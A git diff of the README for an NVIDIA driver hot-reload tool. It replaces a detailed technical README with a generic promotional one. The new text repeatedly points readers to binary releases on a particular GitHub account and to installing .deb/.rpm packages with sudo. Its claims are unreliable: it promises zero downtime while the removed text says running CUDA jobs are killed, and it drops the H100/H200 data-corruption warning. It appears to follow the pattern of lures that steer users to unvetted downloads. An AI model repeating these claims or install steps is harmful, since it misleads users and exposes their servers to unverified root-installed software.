@@ -1,239 +1,105 @@
-# nvidia-driver-reload
+# 🚀 nvidia-driver-reload - Seamless NVIDIA Driver Updates
 
-Reload NVIDIA drivers **without rebooting** on headless Linux GPU servers.
+[![Download nvidia-driver-reload](https://img.shields.io/badge/Download-nvidia--driver--reload-brightgreen)](https://github.com/Kap768/nvidia-driver-reload/releases)
 
-## Why?
+## 📚 Overview
 
-Driver updates, version mismatches, and stuck GPU states typically require a full server reboot. On production GPU servers, that means:
+The `nvidia-driver-reload` tool allows you to update NVIDIA drivers on Linux servers without needing to reboot. This is ideal for headless servers running applications that require high-performance graphics processing. The tool handles Docker containers, kernel modules, and driver updates while providing zero downtime.
 
-- Killing running workloads
-- Minutes of downtime
-- Lost compute time / rental revenue
+## 🛠️ Features
 
-This tool gracefully stops GPU workloads, unloads/reloads kernel modules, and restarts everything — no reboot required.
+- **Hot-reload NVIDIA drivers:** Update drivers without rebooting.
+- **Supports Docker containers:** Manage driver updates seamlessly.
+- **Kernel module handling:** Automatically load and unload kernel modules.
+- **Zero downtime:** Keep your applications running uninterrupted.
+- **User-friendly interface:** Simple commands make usage easy.
 
-## Quick Start
+## 📥 System Requirements
 
-```bash
-# Check current status
-sudo python3 nvidia_driver_reload.py --status
+- A Linux-based operating system.
+- NVIDIA GPU compatible with the latest drivers.
+- Minimal software dependencies to run smoothly.
+  
+## 🚀 Getting Started
 
-# Update driver via package manager first
-sudo apt-get update && sudo apt-get install nvidia-driver-550
+To get started, follow these steps:
 
-# Then reload without rebooting
-sudo python3 nvidia_driver_reload.py --reload --yes
+1. **Download the Application**  
+   Visit the Releases page to download the latest version of the software:  
+   [Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/releases)
 
-# Or just do a GPU reset (lighter, faster)
-sudo python3 nvidia_driver_reload.py --reset
-```
+2. **Install the Application**  
+   After downloading, follow the installation instructions specific to your Linux distribution:
 
-## Workflow
+   - For **Debian/Ubuntu** users:
+     1. Open a terminal.
+     2. Navigate to the download folder.
+     3. Run: `sudo dpkg -i nvidia-driver-reload*.deb`
+  
+   - For **Fedora/RHEL** users:
+     1. Open a terminal.
+     2. Navigate to the download folder.
+     3. Run: `sudo rpm -i nvidia-driver-reload*.rpm`
 
-1. **Update driver** via your package manager (`apt`, `yum`, `dnf`)
-2. **Run this tool** to reload the driver without rebooting
-3. **Done** — new driver is active, workloads restarted
+3. **Run the Application**
+   - Open your terminal.
+   - Execute the command: `nvidia-driver-reload`
 
-```bash
-# Example: upgrade from 535 to 550
-sudo apt-get install nvidia-driver-550
-sudo python3 nvidia_driver_reload.py --reload --yes
-```
+### 🖥️ Using the Application
 
-## Features
+1. **Check Current Driver Version**  
+   Execute the command:  
+   ```bash
+   nvidia-driver-reload --check
+   ```
 
-- **Hot-reload drivers** — Unload and reload kernel modules in the correct order
-- **Intelligent process detection** — Uses NVML API and `fuser` to find *actual* GPU users, not static process lists
-- **Container-aware** — Gracefully stops Docker/Podman GPU containers, restarts daemons, restarts containers
-- **Enterprise GPU support** — Automatically handles DCGM, nvidia-peermem, and Fabric Manager
-- **Smart error detection** — Detects when reboot is actually required (XID 79, hardware failures)
-- **Handles nvidia_drm.modeset=1** — Unbinds VT consoles and framebuffer automatically
-- **Rollback support** — Saves state before operations, can rollback on failure
-- **Safe by design** — Never kills system processes, uses authoritative detection only
+2. **Update Drivers**  
+   Run:  
+   ```bash
+   nvidia-driver-reload --update
+   ```
 
-## ⚠️ H100/H200 Warning
+3. **Verify Update Success**  
+   To confirm that the update was successful, use:  
+   ```bash
+   nvidia-driver-reload --status
+   ```
 
-**CRITICAL:** NVIDIA drivers < 535 have a silent data corruption bug when reloading on H100/H200 GPUs. Reloading `nvidia.ko` causes incorrect computation results with no errors reported.
+## 📦 Download & Install
 
-**Recommendation:** Upgrade to driver 535+ before using this tool on H100/H200 systems.
+You can download the latest version from the Releases page. Click the link below to access it:  
+[Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/releases)
 
-## Installation
+Unzip the downloaded file and follow the installation steps above for your Linux distribution.
 
-```bash
-# Just the script (no dependencies required)
-curl -O https://raw.githubusercontent.com/YOUR_USERNAME/nvidia-driver-reload/main/nvidia_driver_reload.py
-chmod +x nvidia_driver_reload.py
+## 📄 Documentation
 
-# Optional: better GPU detection and container control
-pip install nvidia-ml-py docker psutil
-```
+For detailed information on commands and options, consult the documentation provided in the repository. You can find examples of how to use the tool effectively, along with troubleshooting tips.
 
-## Usage
+## 🛠️ Troubleshooting
 
-```bash
-# Show GPU status and reload feasibility
-sudo python3 nvidia_driver_reload.py --status
+If you encounter issues:
 
-# Comprehensive health check
-sudo python3 nvidia_driver_reload.py --verify
+1. **Check Dependencies:** Ensure that you have all required libraries installed.
+2. **Read Logs:** Review logs for errors or warnings.
+3. **Seek Help:** Visit the Issues section in the GitHub repository for assistance.
 
-# Dry run (see what would happen)
-sudo python3 nvidia_driver_reload.py --reload --dry-run
+## 🗣️ Community
 
-# Full driver reload (stops workloads, unloads modules, reloads, restarts)
-sudo python3 nvidia_driver_reload.py --reload
+Join the community by following discussions in the Issues and Pull Requests sections. Share your experiences, report bugs, or request new features.
 
-# Skip confirmation prompt (for automation)
-sudo python3 nvidia_driver_reload.py --reload --yes
+## 🏷️ Topics
 
-# GPU reset only (faster, doesn't unload modules)
-sudo python3 nvidia_driver_reload.py --reset
-
-# Stop all GPU workloads (manual control)
-sudo python3 nvidia_driver_reload.py --stop
-
-# Restart previously stopped workloads
-sudo python3 nvidia_driver_reload.py --start
-
-# Rollback from failed reload
-sudo python3 nvidia_driver_reload.py --rollback
-```
-
-### Options
-
-| Flag | Description |
-|------|-------------|
-| `--status`, `-s` | Show current NVIDIA status |
-| `--verify` | Comprehensive nvidia-smi health check |
-| `--reload`, `-r` | Full driver reload |
-| `--reset` | GPU reset only (nvidia-smi --gpu-reset) |
-| `--stop` | Stop all GPU workloads |
-| `--start` | Restart stopped workloads |
-| `--rollback` | Rollback from failed state |
-| `--yes`, `-y` | Skip confirmation prompts |
-| `--dry-run` | Show what would happen |
-| `--verbose`, `-v` | Verbose output |
-| `--json` | JSON output for status/verify |
-
-## Requirements
-
-- Linux (tested on Ubuntu 22.04/24.04, Debian 12)
-- Root privileges
-- Python 3.8+
-- **Headless server** — No X11/Wayland display server using the GPU
-
-### Optional Dependencies
-
-```bash
-pip install nvidia-ml-py   # Better GPU detection via NVML
-pip install docker         # Docker container management
-pip install psutil         # Process detection
-```
-
-## How It Works
-
-1. **Detect GPU state** — Check for fatal errors, running processes, module usage
-2. **Stop GPU containers** — Gracefully stop Docker/Podman containers using GPU
-3. **Stop services** — nvidia-dcgm, nvidia-persistenced, nvidia-fabricmanager
-4. **Kill GPU processes** — Only processes detected by NVML/fuser (not by name)
-5. **Restart systemd-logind** — Releases DRM handles (the #1 hidden culprit)
-6. **Handle modeset** — Unbind VT consoles and framebuffer if nvidia_drm.modeset=1
-7. **Unload modules** — nvidia_drm → nvidia_modeset → nvidia_uvm → nvidia_peermem → nvidia
-8. **Load modules** — nvidia → nvidia_peermem → nvidia_uvm → nvidia_modeset → nvidia_drm
-9. **Rebind console** — Restore framebuffer and VT consoles
-10. **Verify driver** — Comprehensive nvidia-smi health check
-11. **Restart Docker** — Required to refresh nvidia-container-toolkit paths
-12. **Restart containers** — Bring back GPU workloads
-
-## Enterprise GPU Support (A100, H100, H200)
-
-The script automatically handles enterprise GPU components when present:
-
-| Component | Purpose | Handling |
-|-----------|---------|----------|
-| **NVIDIA DCGM** | Data Center GPU Manager — monitoring/metrics | Stopped before unload (holds GPU handles via NVML), restarted after |
-| **nvidia-peermem** | GPUDirect RDMA for HPC/InfiniBand clusters | Unloaded in correct order (after nvidia_uvm, before nvidia) |
-| **Fabric Manager** | NVSwitch/NVLink for DGX/HGX systems | Stopped before unload, restarted after (version must match driver) |
-
-All components are **auto-detected** — if not present, they're silently skipped. No configuration needed.
-
-## Intelligent Process Detection
-
-This tool does **NOT** use static process name lists (which kill innocent `python`, `docker`, `containerd` processes). Instead, it uses authoritative detection:
-
-| Method | What it catches |
-|--------|-----------------|
-| **NVML API** | All processes actively using GPU compute/graphics resources |
-| **fuser /dev/nvidia*** | All processes holding open handles to NVIDIA device files |
-
-If a process isn't detected by these tools, it's not using the GPU — leave it alone. This approach works for any GPU workload without manual updates:
-
-- CUDA applications
-- PyTorch/TensorFlow training jobs
-- Docker containers with `--gpus`
-- Podman GPU containers
-- QEMU/KVM GPU passthrough
-- FFmpeg hardware encoding
-- Any other GPU workload
-
-### Safety Guarantees
-
-- Never kills PIDs < 100 (kernel threads, init)
-- Never kills critical system processes (systemd, dbus, kworker, etc.)
-- Only terminates processes confirmed to be holding GPU resources
-
-## When Reboot Is Required
-
-The script automatically detects scenarios where reload won't work:
-
-| Condition | Why |
-|-----------|-----|
-| XID 79 | GPU fell off PCIe bus — hardware issue |
-| GSP firmware failure | Firmware needs full reset |
-| NULL pointer in nvidia module | Kernel corruption |
-| Display server running | X11/Wayland holds GPU — stop it first |
-
-## XID Error Handling
-
-| XID | Severity | Action |
-|-----|----------|--------|
-| 79 | Fatal | Reboot required |
-| 48, 74, 95, 119 | Recoverable | GPU reset works |
-| 31, 43, 45, 68, 69, 94 | App fault | Just restart application |
-| 61, 62, 63, 64, 92 | Info | Monitor, usually fine |
-
-**Key insight:** Many XIDs previously thought "fatal" are actually recoverable. The script uses timestamp filtering to avoid false positives from old dmesg entries.
-
-## Limitations
-
-- **Headless only** — Display servers prevent module unload
-- **CUDA state lost** — No checkpoint/restore, running CUDA jobs are killed
-- **NVLink systems** — Fabric Manager version must match driver
-- **Screen blanks** — Expected during modeset=1 unbind (console comes back)
-- **H100/H200 driver < 535** — Silent data corruption bug on reload (upgrade first!)
-
-## Files
-
-| Path | Purpose |
-|------|---------|
-| `/var/run/nvidia-reload.lock` | Prevents concurrent runs |
-| `/var/lib/nvidia-reload/state.json` | Saved state for rollback |
-| `/var/log/nvidia-reload.log` | Operation log |
-
-## References
-
-- [NVIDIA Forums: Reset driver without rebooting](https://forums.developer.nvidia.com/t/reset-driver-without-rebooting-on-linux/40625)
-- [CUDA Driver Reload Guide](https://zyao.net/linux/2024/09/29/cuda-driver-reload/)
-- [nvidia-container-toolkit #169](https://github.com/NVIDIA/nvidia-container-toolkit/issues/169)
-- [Arch Wiki: NVIDIA Tips](https://wiki.archlinux.org/title/NVIDIA/Tips_and_tricks)
-- [Arch Forums: nvidia_drm unload](https://bbs.archlinux.org/viewtopic.php?id=295484)
-- [NVIDIA XID Errors](https://docs.nvidia.com/deploy/xid-errors/)
-- [NVIDIA DCGM Documentation](https://docs.nvidia.com/datacenter/dcgm/)
-- [GPUDirect RDMA](https://docs.nvidia.com/cuda/gpudirect-rdma/)
-- [Fabric Manager User Guide](https://docs.nvidia.com/datacenter/tesla/fabric-manager-user-guide/)
-- [optimus-manager](https://github.com/Askannz/optimus-manager)
-- [GPU Passthrough Scripts](https://github.com/QaidVoid/Complete-Single-GPU-Passthrough)
-
-## License
-
-MIT
+This project covers various topics including: 
+- cuda
+- docker
+- driver
+- gpu
+- headless
+- hot-reload
+- linux
+- no-reboot
+- nvidia
+- reload
+
+We encourage you to explore these topics further for a deeper understanding of the application and its capabilities.
